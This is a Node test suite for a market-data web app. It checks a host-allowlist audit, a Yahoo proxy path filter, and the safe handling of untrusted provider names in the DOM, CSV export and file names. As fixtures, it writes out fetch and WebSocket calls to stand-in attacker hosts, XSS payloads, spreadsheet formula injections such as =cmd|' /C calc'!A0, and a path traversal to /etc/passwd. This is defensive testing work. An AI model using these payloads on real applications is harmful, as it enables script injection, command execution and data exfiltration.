/**
 * The properties the README promises, as tests.
 *
 * This app is now a network client, so the guarantee is not "no requests" - it
 * is "only these hosts". The rest is about treating provider data as untrusted:
 * asset names and symbols are strings a third party controls, and they travel
 * into the DOM, into notifications and into an exported file.
 */

import test from 'node:test';
import assert from 'node:assert/strict';
import path from 'node:path';
import { readFile } from 'node:fs/promises';
import { fileURLToPath } from 'node:url';

import { ALLOWED_HOSTS, auditSources, isDisallowedUrl, SHIPPED_FILES, stripComments } from '../scripts/audit.mjs';
import { buildHistoryCsv, neutralizeFormula, safeFileName } from '../src/lib/exporters.js';
import { isAllowedYahooPath } from '../scripts/serve.mjs';
import * as binance from '../src/providers/binance.js';
import * as finnhub from '../src/providers/finnhub.js';

const root = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..');

/* -------------------------------------------------------------------- audit */

test('no shipped file contacts a host outside the provider allowlist', async () => {
  const findings = await auditSources(root, [...SHIPPED_FILES]);
  assert.deepEqual(findings, []);
});

test('the audit catches what it claims to catch', async () => {
  const cases = [
    ['exfil.js', 'export const go = () => fetch("https://evil.example/collect");', /non-allowlisted host/],
    ['ws.js', 'export const s = new WebSocket("wss://attacker.test/feed");', /non-allowlisted host/],
    ['html.js', 'export const go = (n, t) => { n.innerHTML = t; };', /innerHTML/],
    ['eval.js', 'export const go = (s) => eval(s);', /uses eval\(/],
    ['track.js', 'export const go = () => window.gtag("event", "x");', /analytics/],
    ['page.html', '<script src="https://cdn.example.com/x.js"></script>', /external reference/],
    ['sheet.css', '@import url("https://fonts.example.com/x.css");', /@import/],
    // The CSV reader is gone and must stay gone.
    ['old.js', 'import { parseCsv } from "./csv.js";', /CSV import module/],
    ['upload.html', '<input type="file" accept=".csv">', /file input/],
  ];

  const { mkdtemp, writeFile } = await import('node:fs/promises');
  const { tmpdir } = await import('node:os');
  const scratch = await mkdtemp(path.join(tmpdir(), 'datascope-audit-'));

  for (const [name, source, expected] of cases) {
    await writeFile(path.join(scratch, name), source, 'utf8');
    const findings = await auditSources(scratch, [name]);
    assert.ok(findings.length >= 1, `${name} produced no finding`);
    assert.match(findings.join('\n'), expected, name);
  }
});

test('the allowlist is the set of hosts the app is documented to use', () => {
  for (const host of ['api.binance.com', 'stream.binance.com', 'api.coingecko.com', 'finnhub.io', 'ws.finnhub.io']) {
    assert.ok(ALLOWED_HOSTS.includes(host), host);
  }
  assert.equal(isDisallowedUrl('https://api.binance.com/api/v3/ping'), false);
  assert.equal(isDisallowedUrl('wss://ws.finnhub.io?token=x'), false);
  assert.equal(isDisallowedUrl('/api/yahoo/v8/finance/chart/AAPL'), false);
  assert.equal(isDisallowedUrl('https://evil.example'), true);
  // A lookalike host must not pass on a prefix match.
  assert.equal(isDisallowedUrl('https://api.binance.com.evil.example'), true);
});

test('the audit ignores forbidden words inside comments', () => {
  const code = stripComments(`
    // this comment mentions innerHTML and https://evil.example
    /* and eval( in a block comment */
    const ns = 'http://www.w3.org/2000/svg';
  `);
  assert.equal(code.includes('innerHTML'), false);
  assert.equal(code.includes('evil.example'), false);
  assert.equal(code.includes('http://www.w3.org/2000/svg'), true);
});

test('no shipped module assigns HTML from a string', async () => {
  for (const relative of SHIPPED_FILES.filter((file) => file.endsWith('.js'))) {
    const code = stripComments(await readFile(path.join(root, relative), 'utf8'));
    assert.equal(
      /innerHTML|outerHTML|insertAdjacentHTML|document\.write/.test(code),
      false,
      relative,
    );
  }
});

test('the CSV import path is gone from the whole shipped app', async () => {
  for (const relative of SHIPPED_FILES) {
    const source = await readFile(path.join(root, relative), 'utf8');
    const code = relative.endsWith('.js') ? stripComments(source) : source;
    assert.equal(/\bparseCsv\b/.test(code), false, relative);
    assert.equal(/\bFileReader\b/.test(code), false, relative);
    assert.equal(/type\s*=\s*["']file["']/.test(code), false, relative);
    assert.equal(/\bdrop(zone)?\b.*dataTransfer/.test(code), false, relative);
  }
});

/* ------------------------------------------------------------- yahoo proxy */

test('the local proxy forwards only the two Yahoo paths the app uses', () => {
  assert.equal(isAllowedYahooPath('/v8/finance/chart/AAPL'), true);
  assert.equal(isAllowedYahooPath('/v1/finance/search'), true);

  // Anything else would make this an open proxy on the user's machine.
  assert.equal(isAllowedYahooPath('/v7/finance/download/AAPL'), false);
  assert.equal(isAllowedYahooPath('/'), false);
  assert.equal(isAllowedYahooPath('/v8/finance/chart/'), false);
  assert.equal(isAllowedYahooPath('/v8/finance/chart/../../etc/passwd'), false);
  assert.equal(isAllowedYahooPath('/v8/finance/chart/AAPL/extra'), false);
  assert.equal(isAllowedYahooPath('//evil.example/'), false);
});

/* -------------------------------------------- provider data is untrusted */

const HOSTILE_NAMES = [
  '<script>alert(1)</script>',
  '<img src=x onerror=alert(1)>',
  '=HYPERLINK("http://evil.example","x")',
  '"><svg/onload=alert(1)>',
  '../../etc/passwd',
  '-2+3+cmd|calc',
];

test('a hostile asset name from a provider survives parsing as plain text', () => {
  for (const name of HOSTILE_NAMES) {
    const assets = finnhub.parseSearch({
      result: [{ description: name, displaySymbol: 'EVIL', symbol: 'EVIL', type: 'Common Stock' }],
    });
    assert.equal(assets.length, 1, name);
    assert.equal(typeof assets[0].name, 'string', name);
    // Nothing is stripped or escaped here - it stays data, and the DOM layer
    // renders it with textContent. The audit above is what enforces that.
    assert.equal(assets[0].symbol, 'EVIL');
  }
});

test('a hostile symbol from a provider cannot break the asset key or the chart', () => {
  const assets = binance.parseExchangeInfo({
    symbols: [
      { symbol: '<img src=x onerror=alert(1)>', status: 'TRADING', baseAsset: 'X', quoteAsset: 'USDT' },
    ],
  });
  assert.equal(assets.length, 1);
  assert.equal(assets[0].key, 'binance:<IMG SRC=X ONERROR=ALERT(1)>');
  assert.equal(typeof assets[0].displaySymbol, 'string');
});

test('exported alert history neutralises spreadsheet formulas', () => {
  const csv = buildHistoryCsv([
    {
      ts: Date.UTC(2024, 0, 2, 10, 30),
      name: '=cmd|\' /C calc\'!A0',
      displaySymbol: '+EVIL',
      type: 'price',
      ruleLabel: '-1+1',
      price: 100,
      value: 1,
      body: '@SUM(A1)',
    },
  ]);
  const cells = csv.split('\r\n')[1].split(',');
  for (const cell of cells) {
    const unquoted = cell.replace(/^"|"$/g, '');
    assert.equal(/^[=+\-@\t\r]/.test(unquoted), false, cell);
  }
  assert.match(csv, /'=cmd/);
  assert.match(csv, /'\+EVIL/);
});

test('ordinary values are left untouched by the formula guard', () => {
  assert.equal(neutralizeFormula('Apple Inc.'), 'Apple Inc.');
  assert.equal(neutralizeFormula('BTC/USDT'), 'BTC/USDT');
  assert.equal(neutralizeFormula('100.25'), '100.25');
  assert.equal(neutralizeFormula('ביטקוין'), 'ביטקוין');
});

test('an export filename cannot be shaped by provider data', () => {
  for (const label of [...HOSTILE_NAMES, '', '  ', '..']) {
    const name = safeFileName(label, '2026-09-19', 'csv');
    assert.match(name, /^datascope_[A-Za-z0-9._-]+_2026-09-19\.csv$/, label);
    assert.equal(name.includes('/'), false);
    assert.equal(name.includes('..'), false);
    assert.equal(name.includes('<'), false);
  }
});

/* ---------------------------------------------------------------- the page */

test('the page loads no external script, stylesheet or font', async () => {
  const raw = await readFile(path.join(root, 'index.html'), 'utf8');
  const html = raw.replace(/<!--[\s\S]*?-->/g, ' ');
  // Only the inline SVG namespace may appear as an absolute URL in the markup.
  for (const match of html.matchAll(/\b(?:src|href)\s*=\s*"([^"]*)"/g)) {
    const value = match[1];
    const isLocal = !/^[a-z][a-z0-9+.-]*:/i.test(value) || value.startsWith('data:');
    assert.ok(isLocal, `external asset: ${value}`);
  }
  assert.equal(/gtag|googletagmanager|sentry|hotjar/i.test(html), false);
});

test('the page has no file input and no drop zone left anywhere', async () => {
  const html = await readFile(path.join(root, 'index.html'), 'utf8');
  assert.equal(/type\s*=\s*"file"/.test(html), false);
  assert.equal(/dropzone/i.test(html), false);
  assert.equal(/ondrop|dataTransfer/i.test(html), false);

  // CSV may still appear, but only as the alert-history *export* control -
  // asserted by position rather than by the button's wording, so relabelling it
  // does not quietly turn this check off.
  const mentions = [...html.matchAll(/CSV/g)].length;
  assert.equal(mentions, 1, `CSV appears ${mentions} times; only the export button may mention it`);
  assert.match(html, /id="export-history"[\s\S]{0,160}CSV/);
});
